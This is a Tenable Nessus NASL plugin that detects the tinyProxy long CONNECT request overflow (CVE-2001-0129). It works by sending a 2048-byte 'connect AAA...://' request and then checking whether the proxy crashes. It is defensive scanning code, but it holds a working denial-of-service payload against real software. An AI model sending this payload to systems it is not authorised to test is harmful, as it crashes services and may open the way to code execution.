#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10596);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2001-0129");
 script_bugtraq_id(2217);
 script_xref(name:"OSVDB", value:"493");
 
 script_name(english:"tinyProxy Long Connect Request Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote proxy server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote service crash
by sending it the command :

	connect AAA[...]AAAA://

It may be possible for an attacker to execute arbitrary code
on this host thanks to this flaw." );
 script_set_attribute(attribute:"solution", value:
"If you are using tinyProxy, then upgrade to version 1.3.3a, or 
else contact your vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english:"proxy server heap overflow");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Firewalls");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/www", "Services/http_proxy", 8888);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

ports = add_port_in_list(list:get_kb_list("Services/http_proxy"), port:8888);
www = get_kb_list("Services/www");
if(!isnull(www))ports = make_list(ports, www);

foreach port (ports)
{
 banner = get_http_banner(port:port);
 if ( banner && "DAAP-Server: iTunes" >< banner ) continue;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  req = string("connect ", crap(2048), "://\r\n\r\n");
  send(socket:soc,
	data:req);
   r = http_recv3(socket:soc);
   close(soc);

   for (i = 0; i < 3; i ++)
   {   
    soc2 = open_sock_tcp(port);
    if (soc2) { close(soc2); break; }
    sleep(1);
   }   
   if(!soc2) security_warning(port);
  }
 } 
}
